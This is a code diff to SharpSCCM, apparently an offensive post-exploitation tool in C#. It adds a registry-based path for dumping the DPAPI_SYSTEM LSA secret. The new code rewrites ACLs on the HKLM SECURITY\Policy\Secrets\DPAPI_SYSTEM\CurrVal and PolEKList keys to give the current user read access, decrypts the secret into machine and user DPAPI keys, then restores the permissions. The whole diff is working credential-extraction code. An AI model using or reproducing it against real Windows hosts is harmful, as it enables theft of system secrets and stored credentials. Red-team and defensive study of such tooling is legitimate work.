@@ -14,12 +14,13 @@ using Microsoft.Win32;
 using System.Security.AccessControl;
 using System.Data;
 using System.Runtime.InteropServices.ComTypes;
+using System.Net;
 
 namespace SharpSCCM
 {
     public class LSADump
     {
-        public static List<byte[]> GetDPAPIKeys(bool show = false)
+        public static List<byte[]> GetDPAPIKeys(bool show = false, bool reg = false)
         {
             // retrieves the "DPAPI_SYSTEM" LSA secret wuth the GetLSASecret() function,
             //  returning a list of @(machineDPAPI, userDPAPI)
@@ -27,7 +28,16 @@ namespace SharpSCCM
 
             List<byte[]> dpapiKeys = new List<byte[]>();
 
-            byte[] dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM");
+            byte[] dpapiKeyFull;
+            if (reg)
+            {
+                dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM", reg);
+            }
+            else
+            {
+                dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM");
+            }
+
             byte[] dpapiKeyMachine = new byte[20];
             byte[] dpapiKeyUser = new byte[20];
 
@@ -55,11 +65,17 @@ namespace SharpSCCM
             // NOTE: right now only the "DPAPI_SYSTEM" LSA secret is implemented, but others would be trivial
 
             bool alreadySystem = false;
-            bool regPermissionsModified = false;
+            string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
             RegistrySecurity originalAcl = new RegistrySecurity();
             RegistrySecurity newAcl = new RegistrySecurity();
             RegistryAccessRule newRule;
             RegistrySecurity revertedAcl;
+            string[] LsaRegKeys = new string[] 
+                { 
+                    "SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\\CurrVal\\",
+                    "SECURITY\\Policy\\PolEKList"
+                };
+
 
             if (!Helpers.IsHighIntegrity())
             {
@@ -68,8 +84,6 @@ namespace SharpSCCM
             }
             else
             {
-                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-
                 // Check if we're already system
                 if (currentName == "NT AUTHORITY\\SYSTEM")
                 {
@@ -87,15 +101,16 @@ namespace SharpSCCM
                 // If we're not system and we don't want to escalate, modify the LSA secrets reg key permissions instead
                 else if ((reg == true) && (alreadySystem == false))
                 {
-                    Console.WriteLine("[*] Modifying permissions on registry key: HKLM:\\SECURITY\\Policy\\Secrets");
-
-                    originalAcl = Registry.LocalMachine.OpenSubKey("SECURITY\\Policy\\Secrets\\", RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ReadPermissions).GetAccessControl();
-                    newAcl = originalAcl;
-                    newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
-                    newAcl.AddAccessRule(newRule);
-                    Registry.LocalMachine.OpenSubKey("SECURITY\\Policy\\Secrets\\", RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ChangePermissions).SetAccessControl(newAcl);
-                    regPermissionsModified = true;
-
+                    Console.WriteLine("\r\n\r\n");
+                    foreach (string key in LsaRegKeys)
+                    {
+                        Console.WriteLine("[*] Modifying permissions on registry key: {0}", key);
+                        originalAcl = Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ReadPermissions).GetAccessControl();
+                        newAcl = originalAcl;
+                        newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
+                        newAcl.AddAccessRule(newRule);
+                        Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ChangePermissions).SetAccessControl(newAcl);
+                    }
                 }
             }
 
@@ -120,7 +135,20 @@ namespace SharpSCCM
             byte[] IV = new byte[16];
             byte[] keyPathPlaintext = Crypto.LSAAESDecrypt(tmpKey, keyEncryptedDataRemainder);
 
-            if (!alreadySystem)
+            if (reg)
+            {
+                foreach (string key in LsaRegKeys)
+                {
+                    Console.WriteLine("[*] Reverting permissions on registry key: {0}", key);
+                    revertedAcl = newAcl;
+                    newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
+                    revertedAcl.RemoveAccessRule(newRule);
+                    Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions).SetAccessControl(revertedAcl);
+                }
+                Console.WriteLine("\r\n\r\n");
+            }
+
+            if ((!alreadySystem) && (!reg))
             {
                 Console.WriteLine("[*] RevertToSelf()\r\n");
                 Interop.RevertToSelf();
@@ -136,13 +164,6 @@ namespace SharpSCCM
             {
                 Console.WriteLine("[X] LSA Secret '{0}' not yet implemented!", secretName);
                 return null;
-            }
-
-            if (reg)
-            {
-                revertedAcl = newAcl;
-                revertedAcl.RemoveAccessRule(newRule);
-                Registry.LocalMachine.OpenSubKey("SECURITY\\Policy\\Secrets\\", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions).SetAccessControl(revertedAcl);
             }
         }
 
